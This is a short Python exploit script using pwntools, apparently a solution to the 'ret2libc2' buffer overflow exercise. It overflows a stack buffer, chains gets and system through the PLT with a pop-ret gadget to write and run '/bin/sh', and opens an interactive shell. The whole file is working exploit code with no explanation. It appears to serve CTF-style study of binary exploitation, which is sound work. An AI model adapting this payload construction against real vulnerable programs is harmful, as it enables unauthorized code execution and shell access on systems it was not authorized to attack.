#!/usr/bin/env python3

from pwn import *

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx_ret_addr = 0x0804843d
buf2_addr = 0x0804a080
offset = 0x6c + 4

payload = flat([b'A' * offset, \
	gets_plt, \
	pop_ebx_ret_addr, buf2_addr, \
	system_plt, 0xdeadbeef, buf2_addr])

sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()